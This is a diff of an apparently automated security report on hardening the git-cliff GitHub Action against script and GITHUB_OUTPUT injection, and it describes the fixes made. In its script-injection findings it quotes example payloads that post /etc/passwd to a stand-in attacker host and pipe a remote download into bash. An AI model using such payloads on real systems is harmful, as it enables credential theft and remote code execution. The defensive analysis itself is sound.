@@ -16,20 +16,27 @@ Action **orhun--git-cliff-action/v4.6.0** was hardened automatically. 4 finding(
 
 ### script-injection (severity: high)
 
-Sub-rule (a): Two GitHub Actions expressions are directly interpolated into a `run:` shell command string in the 'Run git-cliff' step: `${{ inputs.config }}` and `${{ inputs.args }}`. Both are user-supplied inputs that flow through YAML template substitution before the shell ever sees them, allowing an attacker to inject arbitrary shell commands. For example, an `args` value of `; curl -d @/etc/passwd attacker.com` would execute as a shell command. These values must be passed via `env:` variables and then referenced as quoted shell variables (e.g., `"$ARGS"`) instead of being interpolated directly. Offending line: `run: ${GITHUB_ACTION_PATH}/run.sh --config=${{ inputs.config }} ${{ inputs.args }}`
+Sub-rule (a): Direct expression interpolation in a run: block. In action.yml line 40, the shell command directly interpolates `${{ inputs.config }}` and `${{ inputs.args }}` into the shell command string: `run: ${GITHUB_ACTION_PATH}/run.sh --config=${{ inputs.config }} ${{ inputs.args }}`. Both `inputs.config` and `inputs.args` are attacker-controlled values that flow through YAML template substitution before the shell parses them, enabling arbitrary command injection (e.g., an `args` value of `; curl attacker.com | bash` would execute). These inputs must be passed via env vars and double-quoted in the script instead.
 
 Locations:
 
-- `action.yml:45`
+- `action.yml:40`
 
 ### github-env-injection (severity: high)
 
-In run.sh, the `$OUTPUT` variable — which is derived from the user-controlled `inputs.args` input (via `--output=` argument parsing) — is written to `$GITHUB_OUTPUT` without the required sanitization step (`printf '%s' ... | tr -d '\n\r'`). This allows an attacker to inject arbitrary key=value pairs into the GitHub Actions output environment by supplying a newline in the output path. Affected writes: (1) `echo "content<<EOF" >> $GITHUB_OUTPUT` / `cat "$OUTPUT" >> $GITHUB_OUTPUT` — file content at a user-controlled path is streamed directly into GITHUB_OUTPUT; (2) `echo "changelog=$OUTPUT" >> $GITHUB_OUTPUT` — the unsanitized user-controlled path is written as an output value. Both writes must be preceded by sanitizing the value with `printf '%s' "$OUTPUT" | tr -d '\n\r'`.
+run.sh writes unsanitized, user-influenced values to $GITHUB_OUTPUT without the required `printf '%s' ... | tr -d '\n\r'` sanitization step:
+
+1. Line 57-59: `cat "$OUTPUT" >> $GITHUB_OUTPUT` — the full content of the changelog file is streamed directly into GITHUB_OUTPUT using a heredoc with the literal delimiter 'EOF'. If any commit message or changelog entry contains a line consisting solely of 'EOF', it will prematurely terminate the heredoc and allow injection of arbitrary key=value pairs into GITHUB_OUTPUT.
+
+2. Line 63: `echo "changelog=$OUTPUT" >> $GITHUB_OUTPUT` — $OUTPUT is derived from the `--output` argument in `inputs.args` (attacker-controlled via the calling workflow). A value containing newlines would inject additional entries into GITHUB_OUTPUT.
+
+3. Line 66: `echo "version=$(jq -r '.[0].version' $CONTEXT)" >> $GITHUB_OUTPUT` — the version string extracted from git-cliff's JSON output (sourced from git tags, which can be attacker-controlled in a PR context) is written without sanitization. A newline in the version string would inject additional GITHUB_OUTPUT entries.
 
 Locations:
 
-- `run.sh:55`
-- `run.sh:58`
+- `run.sh:57`
+- `run.sh:63`
+- `run.sh:66`
 
 ### static-inline-injection (severity: high)
 
@@ -55,7 +62,9 @@ Locations:
 
 **Notes:**
 
-Fixed three categories of findings:
-1. action.yml (script-injection / static-inline-injection): Moved `${{ inputs.config }}` and `${{ inputs.args }}` out of the `run:` shell string into the `env:` block as `GIT_CLIFF_CONFIG` and `GIT_CLIFF_ARGS`. The run: block now uses xargs-based quote-aware tokenization to build an args array, preventing shell injection.
-2. run.sh (github-env-injection): Added `SAFE_OUTPUT="$(printf '%s' "$OUTPUT" | tr -d '\n\r')"` to sanitize the user-controlled output path before writing to $GITHUB_OUTPUT. All GITHUB_OUTPUT writes now use the sanitized $SAFE_OUTPUT variable instead of the raw $OUTPUT.
+Fixed all four findings:
+1. action.yml: Moved `${{ inputs.config }}` and `${{ inputs.args }}` from the run: block into the env: map as INPUT_CONFIG and INPUT_ARGS. The args list is tokenized with xargs (quote-aware) into a bash array to preserve argument boundaries. Config is passed double-quoted as --config="$INPUT_CONFIG".
+2. run.sh line 57-59: Replaced the static 'EOF' heredoc delimiter with a randomized one (EOF_<openssl-rand-hex-16>) to prevent changelog content from prematurely terminating the heredoc and injecting into GITHUB_OUTPUT.
+3. run.sh line 63: Sanitized $OUTPUT with `printf '%s' "$OUTPUT" | tr -d '\n\r'` before writing changelog= to GITHUB_OUTPUT.
+4. run.sh line 66: Extracted the version into a separate variable first (preserving exit code under errexit), then sanitized with `printf '%s' "$raw_version" | tr -d '\n\r'` before writing version= to GITHUB_OUTPUT.
 
